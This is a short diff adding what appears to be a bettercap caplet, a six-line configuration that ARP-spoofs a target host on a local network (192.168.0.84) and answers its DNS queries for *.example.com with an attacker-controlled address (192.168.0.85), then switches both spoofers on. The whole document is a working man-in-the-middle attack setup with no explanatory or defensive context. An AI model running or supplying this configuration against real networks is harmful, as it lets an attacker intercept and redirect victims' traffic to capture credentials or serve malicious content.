@@ -1,0 +1,6 @@
+set arp.spoof.targets 192.168.0.84
+set dns.spoof.domains *.example.com
+set dns.spoof.address 192.168.0.85
+set dns.spoof.all true
+arp.spoof on
+dns.spoof on
